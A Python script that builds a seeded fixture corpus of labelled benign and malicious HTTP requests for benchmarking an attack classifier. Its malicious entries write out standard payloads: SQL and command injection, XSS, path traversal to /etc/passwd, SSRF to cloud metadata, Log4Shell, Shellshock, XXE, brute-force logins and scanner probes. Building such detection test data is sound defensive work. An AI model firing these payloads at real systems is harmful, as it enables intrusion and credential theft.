"""Generate fixtures/corpus.jsonl: a labelled benign/malicious request corpus.

Malicious entries are standard, publicly documented detection signatures
(OWASP testing guide / CRS regression style) for benchmarking a classifier.
Deterministic: seeded RNG, same output on every run.
"""
import json
import random
from pathlib import Path
from urllib.parse import quote

OUT = Path(__file__).resolve().parent / "fixtures" / "corpus.jsonl"
SEED = 1337
N_BENIGN = 510

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
]
TERMS = ["red running shoes", "python tutorial", "weather in delhi", "best pizza near me",
         "laptop deals", "how to bake bread", "cricket scores", "train timetable",
         "coffee grinder", "yoga for beginners", "holiday packages goa", "wireless earbuds",
         "o'reilly books", "rock & roll history", "budget 2026", "mutual funds india"]
FILES = ["report.pdf", "invoice_2026.pdf", "photo.jpg", "notes.txt", "resume.docx",
         "budget.xlsx", "logo.png", "readme.md", "summary.csv", "presentation.pptx"]
USERS = ["alice", "bob", "carol", "dave", "eswar", "priya", "rahul", "meera"]
PATHS = ["/", "/", "/about", "/products", "/contact", "/help", "/static/app.js", "/static/style.css"]


def req(method, path, query="", headers=None, body="", label="benign", cat="none"):
    return {"method": method, "path": path, "query": query, "headers": headers or {},
            "body": body, "true_label": label, "true_category": cat}


def benign(rng):
    h = {"User-Agent": rng.choice(UAS), "Accept": "text/html,application/xhtml+xml"}
    if rng.random() < 0.3:
        h["Cookie"] = f"session={rng.getrandbits(64):016x}"
    kind = rng.choice(["home", "search", "profile", "files", "login", "login", "page"])
    if kind == "home":
        return req("GET", "/", "", h)
    if kind == "page":
        return req("GET", rng.choice(PATHS), "", h)
    if kind == "search":
        return req("GET", "/search", "q=" + quote(rng.choice(TERMS)), h)
    if kind == "profile":
        return req("GET", "/profile", f"id={rng.randint(1, 5000)}", h)
    if kind == "files":
        return req("GET", "/files", "name=" + rng.choice(FILES), h)
    h["Content-Type"] = "application/json"
    body = json.dumps({"username": rng.choice(USERS), "password": f"Pass{rng.randint(1000, 9999)}!x"})
    return req("POST", "/login", "", h, body)


def malicious(rng):
    ua = lambda: {"User-Agent": rng.choice(UAS)}
    out = []

    def add(cat, method, path, query="", body="", headers=None):
        out.append(req(method, path, query, headers or ua(), body, "malicious", cat))

    for p in ["' OR '1'='1", "' OR 1=1--", "admin'--", "1' UNION SELECT NULL,NULL--",
              "1 UNION SELECT username,password FROM users", "1; DROP TABLE users--",
              "' OR 'a'='a", "1' AND SLEEP(5)--", "1 AND 1=1", "1' ORDER BY 3--",
              "' UNION ALL SELECT 1,2,3--", "1'; WAITFOR DELAY '0:0:5'--"]:
        add("sql_injection", "GET", "/profile", "id=" + quote(p))
    add("sql_injection", "GET", "/search", "q=" + quote("x' OR 1=1#"))
    add("sql_injection", "POST", "/login", "", json.dumps({"username": "admin' --", "password": "x"}),
        {"User-Agent": rng.choice(UAS), "Content-Type": "application/json"})

    for p in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
              "\"><script>alert(document.cookie)</script>", "<body onload=alert(1)>",
              "javascript:alert(1)", "<iframe src=javascript:alert(1)>", "'><img src=x onerror=alert(1)>",
              "<script>alert('XSS')</script>", "<input onfocus=alert(1) autofocus>",
              "<a href=\"javascript:alert(1)\">x</a>"]:
        add("xss", "GET", "/search", "q=" + quote(p))
    add("xss", "POST", "/contact", "", "message=" + quote("<script>alert(1)</script>"),
        {"User-Agent": rng.choice(UAS), "Content-Type": "application/x-www-form-urlencoded"})

    for p in ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd",
              "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%2f..%2f..%2fetc%2fshadow",
              "/etc/passwd", "../../../../etc/hosts", "%252e%252e%252fetc%252fpasswd",
              "../../../proc/self/environ", "..%c0%af..%c0%afetc/passwd",
              "../../../../boot.ini", "file=../../../etc/passwd%00.jpg"]:
        add("path_traversal", "GET", "/files", "name=" + p)

    for p in ["; ls -la", "| cat /etc/passwd", "`id`", "$(whoami)", "; cat /etc/passwd",
              "&& id", "| uname -a", "; ping -c 4 127.0.0.1", "|| whoami", "; sleep 5",
              "\n/bin/ls"]:
        add("command_injection", "GET", "/search", "q=" + quote("test" + p, safe="`$()|;&"))

    for u in ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22/", "http://localhost/admin",
              "http://[::1]/", "http://0.0.0.0:8080/", "file:///etc/passwd", "http://10.0.0.1/",
              "http://192.168.1.1/", "gopher://127.0.0.1:6379/_INFO",
              "http://metadata.google.internal/computeMetadata/v1/"]:
        add("ssrf", "GET", "/fetch", "url=" + quote(u, safe=""))

    weak = ["123456", "password", "admin", "qwerty", "letmein", "12345678",
            "welcome", "password1", "abc123", "111111", "iloveyou", "admin123"]
    for i, pw in enumerate(weak):
        user = "admin" if i % 3 else "root"
        add("auth_bruteforce", "POST", "/login", "", json.dumps({"username": user, "password": pw}),
            {"User-Agent": "python-requests/2.31.0", "Content-Type": "application/json"})

    for p in ["/.env", "/wp-admin", "/wp-login.php", "/phpmyadmin/", "/.git/config", "/.git/HEAD",
              "/server-status", "/admin.php", "/backup.zip", "/.DS_Store", "/config.php.bak",
              "/xmlrpc.php"]:
        add("scanner_probe", "GET", p, headers={"User-Agent": rng.choice(["Nikto/2.5.0", "sqlmap/1.7", "masscan/1.3", "Nmap Scripting Engine"])})

    add("other_exploit", "GET", "/", headers={"User-Agent": "${jndi:ldap://example.test/a}"})
    add("other_exploit", "GET", "/cgi-bin/test.cgi", headers={"User-Agent": "() { :; }; echo vulnerable"})
    add("other_exploit", "POST", "/api/xml", "", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>',
        {"User-Agent": rng.choice(UAS), "Content-Type": "application/xml"})
    add("other_exploit", "GET", "/", "class.module.classLoader.resources.context.parent.pipeline=x")
    add("other_exploit", "POST", "/upload", "", "filename=shell.php",
        {"User-Agent": rng.choice(UAS), "Content-Type": "application/x-www-form-urlencoded"})
    add("other_exploit", "GET", "/redirect", "next=" + quote("//evil.test/%0d%0aSet-Cookie:x=1", safe="/"))
    add("other_exploit", "POST", "/api/items", "", "{\"__proto__\": {\"admin\": true}}",
        {"User-Agent": rng.choice(UAS), "Content-Type": "application/json"})
    return out


def main():
    rng = random.Random(SEED)
    rows = [benign(rng) for _ in range(N_BENIGN)] + malicious(rng)
    rng.shuffle(rows)
    OUT.parent.mkdir(exist_ok=True)
    with OUT.open("w") as f:
        for r in rows:
            f.write(json.dumps(r, sort_keys=True) + "\n")
    print(f"wrote {len(rows)} rows to {OUT}")


if __name__ == "__main__":
    main()
